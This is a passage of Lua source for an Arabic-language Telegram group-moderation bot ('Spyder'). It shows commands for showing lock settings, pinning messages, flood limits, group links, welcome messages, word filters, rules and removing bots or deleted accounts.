lock_vico = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = 'بالطرد 🚷'    
else
lock_vico = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = 'بالتقيد 🔏'
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = 'بالطرد 🚷'
else
lock_inlin = 'مفتوح'
end
if redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "del" then
lock_fwd = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = 'بالطرد 🚷'    
else
lock_fwd = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "del" then
lock_file = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "ked" then 
lock_file = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "kick" then 
lock_file = 'بالطرد 🚷'    
else
lock_file = 'مفتوح'    
end    
if redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = 'بالطرد 🚷'    
else
lock_self = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_) == 'del' then
lock_bots = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_) == 'ked' then
lock_bots = 'بالتقيد 🔏'   
elseif redis:get('Spyder:'..bot_id.."lock:Bot:kick"..msg.chat_id_) == 'kick' then
lock_bots = 'بالطرد 🚷'    
else
lock_bots = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = 'بالطرد 🚷'    
else
lock_mark = 'مفتوح'    
end
if redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = 'مقفول'
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = 'بالتقيد 🔏'    
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = 'بالكتم 🔇'    
elseif redis:get('Spyder:'..bot_id.."lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = 'بالطرد 🚷'    
else
lock_spam = 'مفتوح'    
end        
if not redis:get('Spyder:'..bot_id..'Reply:Owners'..msg.chat_id_) then
rdmder = 'مفتوح'
else
rdmder = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'lock:Reply:Sudo_bot'..msg.chat_id_) then
rdsudo = 'مفتوح'
else
rdsudo = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'lock:id'..msg.chat_id_)  then
idgp = 'مفتوح'
else
idgp = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'lock:id:Photo'..msg.chat_id_) then
idph = 'مفتوح'
else
idph = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'Lock:kick'..msg.chat_id_)  then
setadd = 'مفتوح'
else
setadd = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'Lock:Add:Bot'..msg.chat_id_)  then
banm = 'مفتوح'
else
banm = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'Added:Me'..msg.chat_id_) then
addme = 'مفتوح'
else
addme = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'Seh:User'..msg.chat_id_) then
sehuser = 'مفتوح'
else
sehuser = 'مقفول'
end
if not redis:get('Spyder:'..bot_id..'Cick:Me'..msg.chat_id_) then
kickme = 'مفتوح'
else
kickme = 'مقفول'
end
NUM_MSG_MAX = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
'*\n☑┋ ااعدادات المجموعه ...'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉~'..
'\n✖┋ علامة ال {مقفول} تعني مفعل'..
'\n✖┋ علامة ال {مفتوح} تعني معطل'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉~'..
'\n🔗┋ الروابط ↫ { '..lock_links..
' }\n'..'©┋ المعرفات ↫ { '..lock_user..
' }\n'..'#️⃣┋ التاك ↫ { '..lock_hash..
' }\n'..'🤖┋ البوتات ↫ { '..lock_bots..
' }\n'..'💱┋ التوجيه ↫ { '..lock_fwd..
' }\n'..'📌┋ التثبيت ↫ { '..lock_pin..
' }\n'..'🔅┋ الاشعارات ↫ { '..lock_tagservr..
' }\n'..'⚜️┋ الماركدون ↫ { '..lock_mark..
' }\n'..'📝┋ التعديل ↫ { '..lock_edit..
' }\n'..'🎬┋ الميديا ↫ { '..lock_edit_med..
' }\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉~'..
'\n'..'📑┋ الكلايش ↫ { '..lock_spam..
' }\n'..'🔒┋ الكيبورد ↫ { '..lock_inlin..
' }\n'..'🎶┋ الاغاني ↫ { '..lock_vico..
' }\n'..'🎑┋ المتحركه ↫ { '..lock_gif..
' }\n'..'🗂┋ الملفات ↫ { '..lock_file..
' }\n'..'💭┋ الدردشه ↫ { '..lock_text..
' }\n'..'🎥┋ الفيديو ↫ { '..lock_ved..
' }\n'..'🏞┋ الصور ↫ { '..lock_photo..
' }\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'..
'\n'..'🔉┋ الصوت ↫ { '..lock_muse..
' }\n'..'🎎┋ الملصقات ↫ { '..lock_ste..
' }\n'..'📞┋ الجهات ↫ { '..lock_phon..
' }\n'..'🙋‍♂️┋ الدخول ↫ { '..lock_join..
' }\n'..'🚸┋ الاضافه ↫ { '..lock_add..
' }\n'..'🎭┋ السيلفي ↫ { '..lock_self..
' }\n'..'🎮┋ الالعاب ↫ { '..lock_geam..
' }\n'..'⭐️┋ التكرار ↫ { '..flood..
' }\n'..'🤹‍♂️┋ الترحيب ↫ { '..welcome..
' }\n'..'♻️┋ عدد التكرار ↫ { '..NUM_MSG_MAX..
' }\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉~'..
'\n'..'〽️┋ امر صيح ↫ { '..kickme..
' }\n'..'〽️┋ امر اطردني ↫ { '..sehuser..
' }\n'..'〽️┋ امر منو ضافني ↫ { '..addme..
' }\n'..'〽️┋ ردود المدير ↫ { '..rdmder..
' }\n'..'〽️┋ ردود المطور ↫ { '..rdsudo..
' }\n'..'〽️┋ الايدي ↫ { '..idgp..
' }\n'..'〽️┋ الايدي بالصوره ↫ { '..idph..
' }\n'..'〽️┋ الرفع ↫ { '..banm..
' }\n'..'〽️┋ الحظر ↫ { '..setadd..' }\n\n.*'
send(msg.chat_id_, msg.id_,text)     
end    
if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
if redis:sismember('Spyder:'..bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"⌔︙ التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"⌔︙ تم تثبيت الرساله")   
redis:set('Spyder:'..bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌔︙ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_,"⌔︙ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌔︙ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
if text == 'الغاء التثبيت' and Mod(msg) then  
if redis:sismember('Spyder:'..bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"⌔︙ التثبيت والغاء التثبيت تم قفله من قبل المنشئين")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء تثبيت الرساله")   
redis:del('Spyder:'..bot_id..'Pin:Id:Msg'..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌔︙ انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_,"⌔︙ لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌔︙ ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil)
end

if text and text:match('^ضع تكرار (%d+)$') and Mod(msg) then   
local Num = text:match('ضع تكرار (.*)')
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,'⌔︙ تم وضع عدد التكرار ('..Num..')')  
end 
if text and text:match('^ضع زمن التكرار (%d+)$') and Mod(msg) then   
local Num = text:match('^ضع زمن التكرار (%d+)$')
redis:hset('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,'⌔︙ تم وضع زمن التكرار ('..Num..')') 
end
if text == "ضع رابط" or text == 'وضع رابط' then
if msg.reply_to_message_id_ == 0  and Mod(msg) then  
send(msg.chat_id_,msg.id_,"⌔︙ ارسل رابط المجموعه او رابط قناة المجموعه")
redis:setex('Spyder:'..bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "تفعيل جلب الرابط" or text == 'تفعيل الرابط' then
if Mod(msg) then  
redis:set('Spyder:'..bot_id.."Group:Link"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"⌔︙تم تفعيل الرابط") 
return false  
end
end
if text == "تعطيل جلب الرابط" or text == 'تعطيل الرابط' then
if Mod(msg) then  
redis:del('Spyder:'..bot_id.."Group:Link"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"⌔︙تم تعطيل الرابط") 
return false end
end
if text == "الرابط" or text == "رابط الكروب" then 
local status_Link = redis:get('Spyder:'..bot_id.."Group:Link"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"جلب الرابط معطل") 
return false  
end
local link = redis:get('Spyder:'..bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,'⌔︙*رابط المجموعة* -\n ['..link..']')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = '⌔︙ *رابط المجموعة* - \n ['..linkgpp.result..']'
else
linkgp = '⌔︙ لا يوجد رابط ارسل ضع رابط'
end  
send(msg.chat_id_, msg.id_,linkgp)              
end            
end
if text == 'مسح الرابط' or text == 'حذف الرابط' then
if Mod(msg) then
send(msg.chat_id_,msg.id_,"⌔︙ تم مسح الرابط ")           
redis:del('Spyder:'..bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ضع صوره") and Mod(msg) and msg.reply_to_message_id_ == 0 then  
redis:set('Spyder:'..bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,'⌔︙ ارسل لي الصوره') 
return false
end
if text == "حذف الصوره" or text == "مسح الصوره" then 
if Mod(msg) then
https.request('https://api.telegram.org/bot'..token..'/deleteChatPhoto?chat_id='..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'⌔︙ تم ازالة صورة المجموعه') 
end
return false  
end
if text == 'ضع وصف' or text == 'وضع وصف' then  
if Mod(msg) then
redis:setex('Spyder:'..bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_,'⌔︙ ارسل الان الوصف')
end
return false  
end
if text == 'ضع ترحيب' or text == 'وضع ترحيب' then  
if Mod(msg) then
redis:setex('Spyder:'..bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
t  = '⌔︙ ارسل لي الترحيب الان'
tt = '\n⌔︙ يمكنك اضافة مايلي !\n⌔︙ دالة عرض الاسم ↫{`name`}\n⌔︙ دالة عرض المعرف ↫{`user`}'
send(msg.chat_id_, msg.id_,t..tt) 
end
return false  
end
if text == 'الترحيب' and Mod(msg) then 
local GetWelcomeGroup = redis:get('Spyder:'..bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
GetWelcome = GetWelcomeGroup
else 
GetWelcome = '⌔︙لم يتم تعيين ترحيب للمجموعه'
end 
send(msg.chat_id_, msg.id_,'['..GetWelcome..']') 
return false  
end
if text == 'تفعيل الترحيب' and Mod(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:set('Spyder:'..bot_id..'Chek:Welcome'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'⌔︙ تم تفعيل ترحيب المجموعه') 
return false  
end
if text == 'تعطيل الترحيب' and Mod(msg) then  
redis:del('Spyder:'..bot_id..'Chek:Welcome'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'⌔︙ تم تعطيل ترحيب المجموعه') 
return false  
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then 
if Mod(msg) then
redis:del('Spyder:'..bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'⌔︙ تم ازالة ترحيب المجموعه') 
end
return false  
end

if text == "مسح قائمه المنع" and Mod(msg) then   
local list = redis:smembers('Spyder:'..bot_id.."List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
redis:del('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
redis:del('Spyder:'..bot_id.."Add:Filter:Rp2"..v..msg.chat_id_)  
redis:srem('Spyder:'..bot_id.."List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"⌔︙ تم مسح قائمه المنع")  
end

if text == "قائمه المنع" and Mod(msg) then   
local list = redis:smembers('Spyder:'..bot_id.."List:Filter"..msg.chat_id_)  
t = "\n⌔︙ قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do  
local Spyder_Msg = redis:get('Spyder:'..bot_id.."Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..''..k..'- '..v..' ↫ {'..Spyder_Msg..'}\n'    
end  
if #list == 0 then  
t = "⌔︙ لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
end  
if text and text == 'منع' and msg.reply_to_message_id_ == 0 and Mod(msg) then       
send(msg.chat_id_, msg.id_,"⌔︙ ارسل الكلمه لمنعها")  
redis:set('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = redis:get('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == 'rep' then   
send(msg.chat_id_, msg.id_,"⌔︙ارسل التحذير عند ارسال الكلمه")  
redis:set('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
redis:set('Spyder:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
redis:sadd('Spyder:'..bot_id.."List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = redis:get('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"⌔︙تم منع الكلمه مع التحذير")  
redis:del('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = redis:get('Spyder:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
redis:set('Spyder:'..bot_id.."Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
redis:del('Spyder:'..bot_id.."filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == 'الغاء منع' and msg.reply_to_message_id_ == 0 and Mod(msg) then    
send(msg.chat_id_, msg.id_,"⌔︙ارسل الكلمه الان")  
redis:set('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = redis:get('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء منعها ")  
redis:del('Spyder:'..bot_id.."Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
redis:del('Spyder:'..bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)  
redis:srem('Spyder:'..bot_id.."List:Filter"..msg.chat_id_,text)  
return false  end  
end

if text == 'المطور' or text == 'مطور' then
local TEXT_SUDO = redis:get('Spyder:'..bot_id..'TEXT_SUDO')
if TEXT_SUDO then 
send(msg.chat_id_, msg.id_,TEXT_SUDO)
else
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
sendText(msg.chat_id_,Name,msg.id_/2097152/0.5,'md')
end,nil)
end
end

if text == 'حذف كليشه المطور' or text == 'مسح كليشه المطور' and Sudo_id(msg) then
redis:del('Spyder:'..bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,'⌔︙ تم حذف كليشه المطور')
end
if text == 'وضع كليشه المطور' or text == 'ضع كليشه المطور' and Sudo_id(msg) then
redis:set('Spyder:'..bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'⌔︙ ارسل الكليشه الان')
return false
end
if text and redis:get('Spyder:'..bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' then 
redis:del('Spyder:'..bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'⌔︙تم الغاء حفظ كليشة المطور')
return false
end
redis:set('Spyder:'..bot_id..'TEXT_SUDO',text)
redis:del('Spyder:'..bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'⌔︙تم حفظ كليشة المطور')
return false
end

if text == 'تعين الايدي' and Owners(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = redis:get('Spyder:'..bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'⌔︙عذراً عليك الاشتراك في القناة\n⌔︙اشترك هنا ['..redis:get('Spyder:'..bot_id..'add:ch:username')..']')
end
return false
end
redis:setex('Spyder:'..bot_id.."TEEN:ID"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
📃┋ارسل الان النص
🔰┋ يمكنك اضافه :
👤┋`#username` ↫ اسم العضو
📨┋`#msgs` ↫ عدد الرسائل
🏞┋`#photos` ↫ عدد الصور
🎟┋`#id` ↫ ايدي العضو
⏱┋`#auto` ↫ نسبة التفاعل
📌┋`#stast` ↫ رتبة العضو 
📧┋`#edit` ↫ عدد السحكات
🤹‍♂️┋`#game` ↫ عدد نقاطك
📞┋`#AddContact` ↫ عدد الجهات
✨┋`#rdphoto` ↫ تعليق الصوره
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if Owners(msg) then
redis:del('Spyder:'..bot_id.."ALALMY:ID"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '⌔︙ تم ازالة كليشة الايدي ')
end
return false  
end 
if redis:get('Spyder:'..bot_id.."TEEN:ID"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء تعين الايدي") 
redis:del('Spyder:'..bot_id.."TEEN:ID"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del('Spyder:'..bot_id.."TEEN:ID"..msg.chat_id_..""..msg.sender_user_id_) 
local CHENGER_ID = text:match("(.*)")  
redis:set('Spyder:'..bot_id.."ALALMY:ID"..msg.chat_id_,CHENGER_ID)
send(msg.chat_id_, msg.id_,'⌔︙ تم تعين الايدي')    
end

if text == 'مسح البوتات' or text == 'طرد البوتات' and Mod(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
Group_Kick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "⌔︙ لا توجد بوتات في المجموعه")
else
local t = '⛑︙ عدد البوتات هنا >> {'..c..'}\n⌔︙ عدد البوتات التي هي ادمن >> {'..x..'}\n⌔︙تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
if text == 'كشف البوتات' or text == 'البوتات' and Mod(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n⌔︙ قائمة البوتات الموجوده \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = ' {🔅}'
end
text = text..">> [@"..ta.username_..']'..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "⌔︙ لا توجد بوتات في المجموعه")
return false 
end
if #admins == i then 
local a = '\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n⌔︙ عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = '⛑︙ عدد البوتات التي هي ادمن >> {'..t..'}\n⌔︙ ملاحضه علامة ال (🔅) تعني ان البوت ادمن \n💥'
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end
if redis:get('Spyder:'..bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, "⌔︙ تم الغاء حفظ القوانين") 
redis:del('Spyder:'..bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
redis:set('Spyder:'..bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"⌔︙ تم حفظ قوانين المجموعه") 
redis:del('Spyder:'..bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  

if text == 'ضع قوانين' or text == 'وضع قوانين' then 
if Mod(msg) then
redis:setex('Spyder:'..bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"⌔︙ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_,"⌔︙ تم ازالة قوانين المجموعه")  
redis:del('Spyder:'..bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == 'القوانين' then 
local Set_Rules = redis:get('Spyder:'..bot_id.."Set:Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"⌔︙ لا توجد قوانين هنا")   
end    
end
--------------------------
if text and text:match("^تغير رد المطور (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد المطور (.*)$") 
redis:set('Spyder:'..bot_id.."Sudo_bot:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد المطور الى ↫ "..Teext)
end
if text and text:match("^تغير رد المنشئ الاساسي (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد المنشئ الاساسي (.*)$") 
redis:set('Spyder:'..bot_id.."BasicConstructor:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد المنشئ الاساسي الى ↫ "..Teext)
end
if text and text:match("^تغير رد المنشئ (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد المنشئ (.*)$") 
redis:set('Spyder:'..bot_id.."Constructor:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد المنشئ الى ↫ "..Teext)
end
if text and text:match("^تغير رد المدير (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد المدير (.*)$") 
redis:set('Spyder:'..bot_id.."Owners:Reply"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد المدير الى ↫ "..Teext)
end
if text and text:match("^تغير رد الادمن (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد الادمن (.*)$") 
redis:set('Spyder:'..bot_id.."Mod:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد الادمن الى ↫ "..Teext)
end
if text and text:match("^تغير رد المميز (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد المميز (.*)$") 
redis:set('Spyder:'..bot_id.."Vips:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد المميز الى ↫ "..Teext)
end
if text and text:match("^تغير رد العضو (.*)$") and Owners(msg) then
local Teext = text:match("^تغير رد العضو (.*)$") 
redis:set('Spyder:'..bot_id.."Memp:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⌔︙ تم تغير رد العضو الى ↫ "..Teext)
end
----------------------------------------------------------
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Mod(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
Group_Kick(msg.chat_id_, data.id_)
end
end,nil)
end
send(msg.chat_id_, msg.id_,'⌔︙تم فحص الحسابات المحذوفه وتم طردها من المجموعة')
end,nil)
end
end
----------------------------------------------------------
if text == 'الصلاحيات' and Mod(msg) then 
local list = redis:smembers('Spyder:'..bot_id..'Coomds'..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,'⌔︙لا توجد صلاحيات مضافه')
return false
end
t = "\n⌔︙ قائمة الصلاحيات المضافه \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(list) do
var = redis:get('Spyder:'..bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
